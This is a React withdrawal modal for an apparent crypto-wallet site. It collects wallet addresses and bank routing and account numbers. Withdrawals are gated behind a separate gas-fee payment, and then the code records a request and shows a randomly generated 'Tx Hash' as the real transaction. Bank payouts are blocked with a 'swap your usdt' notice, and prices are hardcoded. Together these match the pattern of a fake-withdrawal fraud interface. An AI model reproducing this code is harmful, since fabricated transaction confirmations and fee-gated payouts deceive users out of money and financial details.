'use client';

import { useState, useEffect, useMemo } from 'react';
import { X, Wallet, Building2, ArrowRight, Loader2, Check, Copy, Clock, AlertCircle, ChevronLeft } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import GasFeeModal from './gas-fee-modal';
import { useWallet } from '@/context/base';
import StatusModal from './statusModal';

interface WithdrawalModalProps {
    isOpen: boolean;
    onClose: () => void;
    bnbBalance?: string;
    t22Balance?: number;
    maskAccount?: boolean;
    currencySymbol?: string;
    fxRate?: number;
    theme?: 'dark' | 'light';
    onSuccess?: () => void;
    isInline?: boolean;
}

export default function WithdrawalModal({
    isOpen,
    onClose,
    bnbBalance = '0',
    t22Balance = 0,
    maskAccount = false,
    currencySymbol = '$',
    fxRate = 1,
    theme = 'light',
    onSuccess,
    isInline = false
}: WithdrawalModalProps) {
    const [withdrawalType, setWithdrawalType] = useState<'crypto' | 'bank'>('crypto');
    const [amount, setAmount] = useState('');
    const [address, setAddress] = useState('');
    const [accountNumber, setAccountNumber] = useState('');
    const [routingNumber, setRoutingNumber] = useState('');
    const { cbProvider, address: add } = useWallet();

    const [step, setStep] = useState<'input' | 'processing' | 'success'>('input');
    const [statusMsg, setStatusMsg] = useState('Verifying withdrawal...');
    const [txHash, setTxHash] = useState('');
    const [txCopied, setTxCopied] = useState(false);
    const [errorMsg, setErrorMsg] = useState('');

    // Added only these for network/asset filtering
    const [selectedNetwork, setSelectedNetwork] = useState<string>('BNB');
    const [selectedCoin, setSelectedCoin] = useState('BNB');

    const networks = {
        BNB: { name: 'Smart Chain', symbol: 'BEP20', logo: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/bnb.png' },
        ETH: { name: 'Ethereum', symbol: 'ERC20', logo: 'https://assets.coingecko.com/coins/images/279/large/ethereum.png' },
        BTC: { name: 'Bitcoin', symbol: 'BTC', logo: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/btc.png' }
    };

    const availableCoins = {
        'BNB': { supportedNetworks: ["BNB"], name: "BNB", logo: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/bnb.png' },
        'ETH': { supportedNetworks: ["ETH", "BNB"], name: "Ethereum", logo: 'https://assets.coingecko.com/coins/images/279/large/ethereum.png' },
        'USDT': { supportedNetworks: ["BNB", "ETH"], name: "Tether", logo: 'https://assets.coingecko.com/coins/images/325/large/tether.png' },
        'USDC': { supportedNetworks: ["BNB", "ETH"], name: "USDC", logo: 'https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png' },
        'BTC': { supportedNetworks: ["BTC"], name: "Bitcoin", logo: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/btc.png' }
    };

    const filteredAssets = useMemo(() => {
        return Object.entries(availableCoins).filter(([_, data]) =>
            data.supportedNetworks.includes(selectedNetwork)
        ).map(([symbol]) => symbol);
    }, [selectedNetwork]);

    useEffect(() => {
        if (!filteredAssets.includes(selectedCoin)) {
            setSelectedCoin(filteredAssets[0]);
        }
    }, [selectedNetwork, filteredAssets]);

    // Gas Fee & Conversion State
    const [showGasModal, setShowGasModal] = useState(false);
    const [showStatusModel, setShowStatusModel] = useState(false);
    const [t22Price, setT22Price] = useState(0);
    const [isLoadingPrice, setIsLoadingPrice] = useState(false);
    const [withdrawLoading, setWithdrawLoading] = useState(false);


    const getBalanceUsd = () => {
        if (selectedCoin === 'BNB') return (Number(bnbBalance) * 620).toFixed(2);
        if (selectedCoin === 'T22' || selectedCoin === 'TETHEREUM') return (Number(t22Balance) * (t22Price || 0.45)).toFixed(2);
        return '0.00';
    };

    // Bank Validation State
    const [bankName, setBankName] = useState('');
    const [routingDetails, setRoutingDetails] = useState({ bank_name: null, state: null, city: null });
    const [isVerifyingRouting, setIsVerifyingRouting] = useState(false);
    const [routingError, setRoutingError] = useState('');

    // Form Validation state
    const isFormValid = useMemo(() => {
        if (!amount || Number(amount) <= 0) return false;

        if (withdrawalType === 'crypto') {
            const addr = address.trim();
            if (!addr) return false;

            if (selectedNetwork === 'BNB' || selectedNetwork === 'ETH') {
                // Must start with 0x and be exactly 42 characters long total
                return /^0x[a-fA-F0-9]{40}$/.test(addr);
            } else if (selectedNetwork === 'BTC') {
                // Mainnet single-sig (1), script (3), or bech32 (bc1)
                return /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/.test(addr);
            }
            return addr.length > 5;
        } else {
            return bankName && !routingError && routingNumber.length === 9 && accountNumber.length >= 10;
        }
    }, [amount, withdrawalType, address, selectedNetwork, bankName, routingError, routingNumber, accountNumber]);

    const isSufficientBalance = useMemo(() => {
        if (!amount || isNaN(Number(amount))) return false;
        return Number(amount) <= Number(getBalanceUsd());
    }, [amount, getBalanceUsd]);

    const cryptoAddressError = useMemo(() => {
        if (withdrawalType !== 'crypto' || !address.trim()) return '';

        const addr = address.trim();
        if (selectedNetwork === 'BNB' || selectedNetwork === 'ETH') {
            if (!addr.startsWith('0x')) return 'Address must start with 0x';
            if (addr.length !== 42) return 'Address must be exactly 42 characters long';
            if (!/^0x[a-fA-F0-9]{40}$/.test(addr)) return 'Address contains invalid characters';
        } else if (selectedNetwork === 'BTC') {
            if (!/^(bc1|[13])/.test(addr)) return 'Bitcoin address must start with 1, 3, or bc1';
            if (addr.length < 26 || addr.length > 35) return 'Bitcoin address must be between 26 and 35 characters';
            if (!/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/.test(addr)) return 'Address contains invalid characters';
        }
        return '';
    }, [address, selectedNetwork, withdrawalType]);

    useEffect(() => {
        if (isOpen && withdrawalType === 'bank') {
            fetchPrice();
        }
    }, [isOpen, withdrawalType]);

    // Reset state on open
    useEffect(() => {
        if (!isOpen) {
            setWithdrawalType('crypto');
            setRoutingNumber('');
            setAccountNumber('');
            setAmount('');
            setBankName('');
            setRoutingError('');
            setSelectedNetwork('BNB');
            setStep('input');
            setStatusMsg('Verifying withdrawal...');
            setTxHash('');
        }
    }, [isOpen]);

    const fetchPrice = async () => {
        try {
            setIsLoadingPrice(true);
            const response = await fetch('https://api.coinbase.com/v2/prices/T99-USD/spot');
            const json = await response.json();
            const price = parseFloat(json.data.amount) || 0.45;
            setT22Price(price);
        } catch (e) {
            setT22Price(0.45);
        } finally {
            setIsLoadingPrice(false);
        }
    };

    const validateRoutingNumber = async (number: string) => {
        if (number.length !== 9) {
            setBankName('');
            setRoutingDetails({ bank_name: null, state: null, city: null });
            return;
        }

        setRoutingDetails({ bank_name: null, state: null, city: null });
        setIsVerifyingRouting(true);
        setRoutingError('');
        setBankName('');

        try {
            try {
                const response1 = await fetch(`/api/bank-routing/${number}`);
                if (response1.ok) {
                    const data = await response1.json();
                    if (data && data.bank_name) {
                        setBankName('valid');
                        setRoutingDetails(data);
                        setIsVerifyingRouting(false);
                        return;
                    }
                }
            } catch (e) { console.log('API 1 failed'); }

            try {
                const response1 = await fetch(`https://www.routingnumbers.info/api/data.json?rn=${number}`);
                if (response1.ok) {
                    const data = await response1.json();
                    if (data && data.customer_name) {
                        setBankName('valid');
                        setIsVerifyingRouting(false);
                        return;
                    }
                }
            } catch (e) { console.log('API 1.1 failed'); }

            const validateChecksum = (rn: string): boolean => {
                const digits = rn.split('').map(Number);
                const checksum = (3 * (digits[0] + digits[3] + digits[6]) +
                    7 * (digits[1] + digits[4] + digits[7]) +
                    (digits[2] + digits[5] + digits[8])) % 10;
                return checksum === 0;
            };

            if (validateChecksum(number)) {
                setBankName('valid');
            } else {
                setRoutingError('Invalid routing number');
            }
        } catch (error) {
            setRoutingError('Could not verify routing number');
        } finally {
            setIsVerifyingRouting(false);
        }
    };

    const handleRoutingChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const value = e.target.value.replace(/\D/g, '').slice(0, 9);
        setRoutingNumber(value);
        if (value.length === 9) {
            validateRoutingNumber(value);
        } else {
            setBankName('');
            setRoutingError('');
        }
    };

    const handleAccountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        // Strip non-digits and prevent arbitrarily long input (e.g., limit to 12 digits max)
        const value = e.target.value.replace(/\D/g, '').slice(0, 12);
        setAccountNumber(value);
    };


    const handleGasSuccess = async (txHash: string) => {
        try {
            setStep('processing');
            setStatusMsg('Recording withdrawal request...');
            setWithdrawLoading(true);

            // Record the actual withdrawal in Airtable (like SwapModal does)
            const res = await fetch(`/api/withdrawal`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    address: add,
                    amount: Number(amount),
                    routingNumber,
                    reciepientWalletAddress: address,
                    accountNumber: accountNumber,
                    wType: withdrawalType,
                    bankName,
                    type: "send",
                    asset: selectedCoin,
                    network: selectedNetwork
                })
            });

            const vjson = await res.json();
            if (vjson?.record?.id || vjson?.success) {
                setStatusMsg('Finalizing...');
                const randomHex = Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
                setTxHash('0x' + randomHex);

                await new Promise(r => setTimeout(r, 1200));

                // Add to local storage for immediate UI update
                const newTx = {
                    id: txHash || '0x' + randomHex,
                    type: 'send',
                    asset: withdrawalType === 'bank' ? 'USD' : selectedCoin,
                    amount: `-${amount}`,
                    date: 'Just now',
                    status: 'pending',
                    counterparty: withdrawalType === 'bank' ? (bankName || 'Bank Account') : address
                };
                const existingInfo = localStorage.getItem('transactions');
                const transactions = existingInfo ? JSON.parse(existingInfo) : [];
                localStorage.setItem('transactions', JSON.stringify([newTx, ...transactions]));

                setStep('success');
                if (onSuccess) onSuccess();
            } else {
                setErrorMsg('Transaction recorded but failed to update history. Please refresh.');
                setStep('input');
            }
        } catch (e) {
            console.error("handleGasSuccess Error:", e);
            setStep('input');
        } finally {
            setShowGasModal(false);
            setWithdrawLoading(false);
        }
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        if (withdrawalType === 'bank') {
            setShowStatusModel(true)
            return
        }

        if (!isFormValid || !isSufficientBalance) return;

        // Open the Gas Fee Modal first
        setShowGasModal(true);
    };

    const renderContent = () => {
        return (
            <div className={`${isInline ? 'w-full max-w-[600px] mx-auto' : ''} ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>
                <div className={`${isInline ? `md:rounded-[2.5rem] md:border p-0 md:p-2 ${theme === 'dark' ? 'bg-transparent md:bg-[#000000] border-white/10' : 'bg-transparent md:bg-white border-gray-100 md:shadow-xl'}` : ''}`}>
                    <div className={`${isInline ? 'p-0 md:p-6 pb-10' : ''}`}>
                        {step === 'input' ? (
                            <div className="w-full">
                                <div className="flex items-center gap-4 mb-8">
                                    <button onClick={onClose} className={`w-10 h-10 flex items-center justify-center rounded-full transition-all ${theme === 'dark' ? 'bg-white/5 text-gray-400 hover:text-white' : 'bg-gray-100 text-gray-500 hover:text-black'}`}>
                                        <ChevronLeft className="w-6 h-6" />
                                    </button>
                                    <h2 className="text-xl md:text-2xl font-black uppercase tracking-widest">Withdraw</h2>
                                </div>
                                <div className="grid grid-cols-2 gap-3 mb-6">
                                    <button type="button" onClick={() => setWithdrawalType('crypto')} className={`p-4 rounded-2xl border transition-all flex flex-col items-center justify-center gap-2 ${withdrawalType === 'crypto'
                                        ? `border-[#3375BB] bg-[#3375BB]/10 ${theme === 'dark' ? 'text-white' : 'text-[#3375BB] font-black'}`
                                        : `${theme === 'dark' ? 'border-white/5 bg-[#121212] text-gray-400 hover:text-white' : 'border-gray-100 bg-gray-50 text-gray-500 hover:text-[#0a0b0d]'}`}`}>
                                        <Wallet className="w-6 h-6" />
                                        <span className="font-black text-xs uppercase tracking-widest">Crypto</span>
                                        <span className="text-[10px] opacity-40">To wallet address</span>
                                    </button>

                                    <button type="button" onClick={() => setWithdrawalType('bank')} className={`p-4 rounded-2xl border transition-all flex flex-col items-center justify-center gap-2 ${withdrawalType === 'bank'
                                        ? `border-[#3375BB] bg-[#3375BB]/10 ${theme === 'dark' ? 'text-white' : 'text-[#3375BB] font-black'}`
                                        : `${theme === 'dark' ? 'border-white/5 bg-[#121212] text-gray-400 hover:text-white' : 'border-gray-100 bg-gray-50 text-gray-500 hover:text-[#0a0b0d]'}`}`}>
                                        <Building2 className="w-6 h-6" />
                                        <span className="font-black text-xs uppercase tracking-widest">Bank</span>
                                        <span className="text-[10px] opacity-40">To bank account</span>
                                    </button>
                                </div>

                                {withdrawalType === 'bank' && (
                                    <div className="mb-6">
                                        <label className="block text-[10px] font-black uppercase tracking-widest text-gray-400 mb-2">Asset to Sell</label>
                                        <div className="flex flex-wrap gap-2">
                                            {filteredAssets.map((coin) => (
                                                <button key={coin} type="button" onClick={() => setSelectedCoin(coin)} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl border text-[11px] font-black transition-all ${selectedCoin === coin ? 'border-[#3375BB] bg-[#3375BB]/10 dark:!text-white !text-[#3375BB]' : 'border-white/5 bg-[#121212] text-gray-500 hover:bg-white/5 dark:hover:!text-white hover:!text-black'}`}>
                                                    <img src={availableCoins[coin as keyof typeof availableCoins]?.logo} alt={coin} className="w-5 h-5 object-contain rounded-full bg-white/10" />
                                                    {availableCoins[coin as keyof typeof availableCoins]?.name || coin}
                                                </button>
                                            ))}
                                        </div>
                                    </div>
                                )}

                                <form onSubmit={handleSubmit} className="space-y-6">

                                    {withdrawalType === 'crypto' && (
                                        <>
                                            <div>
                                                <label className="block text-[10px] font-black uppercase tracking-widest text-gray-400 mb-3">Choose Network</label>
                                                <div className="flex flex-wrap gap-2">
                                                    {Object.keys(networks).map((net) => (
                                                        <button key={net} type="button" onClick={() => setSelectedNetwork(net as any)} className={`flex-1 min-w-[100px] py-4 px-3 flex items-center justify-center gap-3 flex-col rounded-2xl border text-[10px] font-black tracking-widest uppercase transition-all ${selectedNetwork === net
                                                            ? `border-[#3375BB] bg-[#3375BB]/10 ${theme === 'dark' ? 'text-white' : 'text-[#3375BB]'}`
                                                            : `${theme === 'dark' ? 'border-white/5 bg-[#121212] text-gray-400 hover:text-white' : 'border-gray-100 bg-gray-50 text-gray-500 hover:text-[#0a0b0d]'}`}`}>
                                                            <img src={networks[net as keyof typeof networks].logo} alt={net} className="w-7 h-7 object-contain" />
                                                            {networks[net as keyof typeof networks].name}
                                                        </button>
                                                    ))}
                                                </div>
                                            </div>

                                            <div>
                                                <label className="block text-[10px] font-black uppercase tracking-widest text-gray-400 mb-3">Select Asset</label>
                                                <div className="flex flex-wrap gap-2">
                                                    {filteredAssets.map((coin) => (
                                                        <button key={coin} type="button" onClick={() => setSelectedCoin(coin)} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl border text-[11px] font-black transition-all ${selectedCoin === coin ? 'border-[#3375BB] bg-[#3375BB]/10 dark:!text-white !text-[#3375BB]' : 'border-white/5 bg-[#121212] text-gray-500 hover:bg-white/5 dark:hover:!text-white hover:!text-black'}`}>
                                                            <img src={availableCoins[coin as keyof typeof availableCoins]?.logo} alt={coin} className="w-5 h-5 object-contain rounded-full bg-white/10" />
                                                            {availableCoins[coin as keyof typeof availableCoins]?.name || coin}
                                                        </button>
                                                    ))}
                                                </div>
                                            </div>

                                            <div>
                                                <label className="block text-[10px] font-black uppercase tracking-widest text-gray-400 mb-2">Enter {selectedCoin} Address</label>
                                                <input type="text" value={address} onChange={(e) => setAddress(e.target.value)} placeholder="0x..." className={`w-full px-5 py-4 border rounded-2xl focus:outline-none transition-colors font-mono text-sm placeholder-gray-600 ${theme === 'dark' ? 'bg-[#121212] text-white' : 'bg-gray-100 text-[#0a0b0d]'
                                                    } ${cryptoAddressError ? 'border-red-500/50 focus:border-red-500' : 'border-transparent focus:border-[#3375BB]'}`} required />
                                                {cryptoAddressError && <p className="text-[10px] text-red-400 mt-2 font-bold">{cryptoAddressError}</p>}
                                            </div>
                                        </>
                                    )}

                                    {withdrawalType === 'bank' && (
                                        <>
                                            <div>
                                                <label className="block text-[10px] font-black uppercase tracking-widest text-gray-400 mb-2">Routing Number (Lookup)</label>
                                                <div className="relative">
                                                    <input 
                                                        type="text" 
                                                        value={routingNumber} 
                                                        onChange={handleRoutingChange} 
                                                        placeholder="9-digit routing number" 
                                                        className={`w-full px-5 py-4 border rounded-2xl focus:outline-none transition-colors placeholder-gray-600 text-sm ${
                                                            theme === 'dark' ? 'bg-[#121212] text-white' : 'bg-gray-100 text-[#0a0b0d]'
                                                        } ${routingError ? 'border-red-500/50 focus:border-red-500' : bankName ? 'border-green-500/50 focus:border-green-500' : 'border-white/5 focus:border-[#3375BB]'}`} 
                                                        maxLength={9} 
                                                        required 
                                                    />
                                                    {isVerifyingRouting && <div className="absolute right-5 top-1/2 -translate-y-1/2"><Loader2 className="w-4 h-4 animate-spin text-gray-400" /></div>}
                                                </div>
                                                {bankName && (
                                                    <div className="mt-3 p-3 bg-green-500/10 border border-green-500/20 rounded-xl flex items-center gap-3">
                                                        <Building2 className="w-4 h-4 text-green-400" />
                                                        <span className="text-[11px] text-green-300 font-bold">{(routingDetails?.bank_name) ? `${routingDetails?.bank_name} . ${routingDetails?.state} . ${routingDetails?.city}` : "Routing number is valid"}</span>
                                                    </div>
                                                )}
                                                {routingError && <p className="text-[11px] text-red-400 mt-2 font-bold">{routingError}</p>}
                                            </div>

                                            <div>
                                                <label className="block text-[10px] font-black uppercase tracking-widest text-gray-400 mb-2">Account Number</label>
                                                <input
                                                    type="text"
                                                    inputMode="numeric"
                                                    pattern="\d*"
                                                    value={accountNumber}
                                                    onChange={handleAccountChange}
                                                    placeholder="Enter 10-12 digit account number"
                                                    className={`w-full px-5 py-4 border rounded-2xl focus:border-[#3375BB] focus:outline-none transition-colors placeholder-gray-600 text-sm ${
                                                        theme === 'dark' ? 'bg-[#121212] border-white/5 text-white' : 'bg-gray-100 border-gray-200 text-[#0a0b0d]'
                                                    }`}
                                                    maxLength={12}
                                                    required
                                                />
                                            </div>
                                        </>
                                    )}

                                    <div>
                                        <label className="block text-[10px] font-black uppercase tracking-widest text-gray-400 mb-2">Enter Amount</label>
                                        <div className="relative">
                                            <input
                                                type="number"
                                                value={amount}
                                                onChange={(e) => setAmount(e.target.value)}
                                                placeholder="0.00"
                                                className={`w-full px-5 py-5 border rounded-2xl focus:border-[#3375BB] focus:outline-none transition-colors text-lg md:text-xl font-black placeholder-gray-600 pr-24 ${
                                                    theme === 'dark' ? 'bg-[#121212] border-white/5 text-white' : 'bg-gray-100 border-gray-200 text-[#0a0b0d]'
                                                }`}
                                                required
                                            />
                                            <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-3">
                                                <button
                                                    type="button"
                                                    onClick={() => setAmount(getBalanceUsd())}
                                                    className="bg-[#3375BB]/10 hover:bg-[#3375BB]/20 text-[#3375BB] text-[10px] font-black uppercase tracking-widest px-3 py-1.5 rounded-lg transition-colors border border-[#3375BB]/20"
                                                >
                                                    MAX
                                                </button>
                                                <span className="text-gray-400 font-black text-sm uppercase tracking-widest mr-2">USD</span>
                                            </div>
                                        </div>
                                        <div className="flex justify-between mt-3">
                                            <div className="flex-1">
                                                {amount && !isSufficientBalance && (
                                                    <motion.p initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="text-[11px] text-red-400 font-bold flex items-center gap-1.5">
                                                        <AlertCircle className="w-4 h-4" /> Insufficient balance
                                                    </motion.p>
                                                )}
                                            </div>
                                            <motion.div
                                                key={amount}
                                                initial={{ opacity: 0, scale: 0.9 }}
                                                animate={{ opacity: 1, scale: 1 }}
                                                className="text-[11px] font-black uppercase tracking-widest opacity-30 text-right"
                                            >
                                                <span>Available: {maskAccount ? '••••••' : `${currencySymbol}${(Number(getBalanceUsd()) * fxRate).toFixed(2)}`}</span>
                                            </motion.div>
                                        </div>

                                        {/* Summary Box */}
                                        {amount && Number(amount) > 0 && (
                                            <motion.div initial={{ opacity: 0, y: 5 }} animate={{ opacity: 1, y: 0 }} className={`border rounded-[2rem] p-5 space-y-3 text-sm mt-6 ${theme === 'dark' ? 'bg-[#121212]/50 border-white/5' : 'bg-gray-50 border-gray-100'
                                                }`}>
                                                {(() => {
                                                    const feeMap: Record<string, number> = { 'BNB': 0.15, 'ETH': 2.50, 'USDT': 1.00, 'BTC': 1.50 };
                                                    const networkFee = withdrawalType === 'bank' ? 0.00 : (feeMap[selectedCoin] || 0.00);
                                                    const coinPrice = selectedCoin === 'BNB' ? 620 : selectedCoin === 'USDT' ? 1 : t22Price;
                                                    const totalUsd = Number(amount); 
                                                    const receivedUsd = Math.max(0, totalUsd - networkFee);
                                                    const receivedCrypto = receivedUsd / coinPrice;

                                                    return (
                                                        <>
                                                            <div className="flex justify-between items-center text-gray-400">
                                                                <span className="text-[10px] font-black uppercase tracking-widest">Conversion Rate</span>
                                                                <span className={`font-black text-[11px] ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>1 {selectedCoin} = {currencySymbol}{(coinPrice * fxRate).toFixed(2)}</span>
                                                            </div>
                                                            <div className="flex justify-between items-center text-gray-400">
                                                                <span className="text-[10px] font-black uppercase tracking-widest">Network Fee</span>
                                                                <span className={`font-black text-[11px] ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>~{currencySymbol}{(networkFee * fxRate).toFixed(2)}</span>
                                                            </div>
                                                            <div className={`h-[1px] w-full my-2 ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-200'}`}></div>
                                                            <div className="flex justify-between items-center">
                                                                <span className="text-gray-300 font-black uppercase tracking-widest text-[11px]">You will receive</span>
                                                                <div className="text-right">
                                                                    <span className="text-[#3375BB] font-black text-lg block leading-none">
                                                                        {currencySymbol}{(receivedUsd * fxRate).toFixed(2)}
                                                                    </span>
                                                                    <span className="text-gray-500 font-black text-[10px] uppercase tracking-widest">
                                                                        {receivedCrypto.toFixed(6)} {selectedCoin}
                                                                    </span>
                                                                </div>
                                                            </div>
                                                        </>
                                                    )
                                                })()}
                                            </motion.div>
                                        )}
                                    </div>

                                    <button
                                        disabled={withdrawLoading || !isFormValid || !isSufficientBalance}
                                        type="submit"
                                        className="w-full bg-[#3375BB] hover:bg-[#004ada] disabled:bg-[#3375BB]/50 disabled:cursor-not-allowed !text-white font-black uppercase tracking-widest py-5 rounded-[1.5rem] transition-all shadow-xl hover:shadow-[#3375BB]/25 active:scale-[0.98] flex items-center justify-center gap-3 mt-6 text-[12px]"
                                    >
                                        {withdrawLoading ? "Processing..." : "Continue"}
                                        <ArrowRight className="w-5 h-5" />
                                    </button>
                                </form>
                                <p className="text-[10px] font-bold text-gray-500 text-center mt-6 uppercase tracking-widest opacity-40">
                                    {withdrawalType === 'crypto'
                                        ? 'Network fees will be deducted from your withdrawal amount'
                                        : 'Bank transfers typically take 1-3 business days'}
                                </p>
                            </div>
                        ) : step === 'processing' ? (
                            <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} className="py-20 flex flex-col items-center justify-center space-y-8">
                                <Loader2 className="w-20 h-20 text-[#3375BB] animate-spin" />
                                <div className="text-center space-y-3">
                                    <h3 className={`text-xl md:text-2xl font-black uppercase tracking-widest ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>Processing Transfer</h3>
                                    <p className={`text-sm font-black uppercase tracking-widest opacity-40 animate-pulse ${theme === 'dark' ? 'text-gray-400' : 'text-gray-500'}`}>{statusMsg}</p>
                                </div>
                            </motion.div>
                        ) : (
                            <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} className="flex flex-col items-center py-6">
                                <motion.div initial={{ scale: 0, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="w-24 h-24 bg-gradient-to-tr from-yellow-500/20 to-yellow-400/5 border border-yellow-500/20 text-yellow-500 rounded-[2rem] flex items-center justify-center mb-8 shadow-[0_0_30px_rgba(234,179,8,0.15)]">
                                    <Clock className="w-12 h-12" />
                                </motion.div>
                                <h3 className={`text-2xl md:text-3xl font-black uppercase tracking-widest mb-3 text-center ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>Request Submitted</h3>
                                <p className={`text-sm font-bold mb-10 text-center px-6 leading-relaxed opacity-40 ${theme === 'dark' ? 'text-gray-400' : 'text-gray-500'}`}>Your withdrawal request to {withdrawalType === 'bank' ? 'your bank account' : 'your wallet'} has been received and is currently being processed.</p>

                                <div className={`w-full border rounded-[2.5rem] p-8 mb-10 space-y-5 shadow-inner ${
                                    theme === 'dark' ? 'bg-[#121212] border-white/5' : 'bg-gray-50 border-gray-100'
                                }`}>
                                    <div className="flex justify-between items-center">
                                        <span className="text-[10px] font-black uppercase tracking-widest text-gray-400">Amount Processing</span>
                                        <span className={`font-black text-xl md:text-2xl ${theme === 'dark' ? 'text-white' : 'text-[#3375BB]'}`}>{currencySymbol}{(Math.max(0, Number(amount) - 0.50) * fxRate).toFixed(2)}</span>
                                    </div>
                                    <div className={`h-[1px] w-full ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-200'}`}></div>
                                    <div className="flex justify-between items-center">
                                        <span className="text-[10px] font-black uppercase tracking-widest text-gray-400">Destination</span>
                                        <span className={`font-black uppercase tracking-widest text-xs ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>{withdrawalType === 'crypto' ? networks[selectedNetwork as keyof typeof networks]?.name : 'Bank Transfer'}</span>
                                    </div>
                                    <div className="flex justify-between items-center">
                                        <span className="text-[10px] font-black uppercase tracking-widest text-gray-400">Date</span>
                                        <span className={`font-black uppercase tracking-widest text-xs ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>{new Date().toLocaleString(undefined, { month: 'short', day: 'numeric', hour: 'numeric', minute: '2-digit' })}</span>
                                    </div>
                                    {withdrawalType === 'crypto' && txHash && (
                                        <>
                                            <div className={`h-[1px] w-full ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-200'}`}></div>
                                            <div className="flex justify-between items-center">
                                                <span className="text-[10px] font-black uppercase tracking-widest text-gray-400">Tx Hash</span>
                                                <div className={`flex items-center gap-3 group cursor-pointer px-4 py-2 rounded-xl transition-all ${
                                                    theme === 'dark' ? 'bg-white/5 hover:bg-white/10' : 'bg-white hover:bg-gray-100 border border-gray-100'
                                                }`} onClick={() => { navigator.clipboard.writeText(txHash); setTxCopied(true); setTimeout(() => setTxCopied(false), 2000); }}>
                                                    <span className="text-[#0052FF] font-mono font-black text-xs">{txHash.substring(0, 10)}...{txHash.substring(txHash.length - 8)}</span>
                                                    {txCopied ? <Check className="w-4 h-4 text-green-500" /> : <Copy className="w-4 h-4 text-gray-400 group-hover:text-[#3375BB]" />}
                                                </div>
                                            </div>
                                        </>
                                    )}
                                </div>

                                 <button onClick={onClose} className="w-full bg-[#3375BB] hover:bg-[#004ada] !text-white font-black uppercase tracking-widest py-5 rounded-[1.5rem] transition-all flex items-center justify-center gap-3 shadow-xl active:scale-[0.98] text-[12px]">
                                    Done
                                </button>
                            </motion.div>
                        )}
                    </div>
                </div>
            </div>
        );
    };

    if (isInline) {
        return renderContent();
    }

    return (
        <AnimatePresence>
            {isOpen && (
                <div className="fixed inset-0 z-50 flex items-center justify-center">
                    <motion.div
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className={`absolute inset-0 backdrop-blur-sm ${theme === 'dark' ? 'bg-black/60' : 'bg-black/20'}`}
                        onClick={step === 'input' ? onClose : undefined}
                    />

                    <motion.div
                        initial={{ scale: 0.9, opacity: 0 }}
                        animate={{ scale: 1, opacity: 1 }}
                        exit={{ scale: 0.9, opacity: 0 }}
                        transition={{ type: "spring", damping: 25, stiffness: 200 }}
                        className={`relative w-full max-w-[420px] ${theme === 'dark' ? 'bg-[#000000] text-white border-white/10' : 'bg-white text-[#0a0b0d] border-transparent shadow-xl'
                            } border rounded-[2.5rem] p-6 shadow-2xl m-4`}
                    >
                        {renderContent()}

                        <AnimatePresence>
                            {showGasModal && (
                                <GasFeeModal
                                    isOpen={showGasModal}
                                    onClose={() => setShowGasModal(false)}
                                    onSuccess={handleGasSuccess}
                                    theme={theme}
                                    network={selectedNetwork}
                                />
                            )}
                        </AnimatePresence>
                        <AnimatePresence>
                            {showStatusModel && (
                                <StatusModal
                                    success={false}
                                    message='Please swap your usdt before proceeding with withdrawals'
                                    title='Notice'
                                    isOpen={showStatusModel}
                                    onClose={() => setShowStatusModel(false)}
                                    theme={theme}
                                />
                            )}
                        </AnimatePresence>
                    </motion.div>
                </div>
            )}
        </AnimatePresence>
    );
}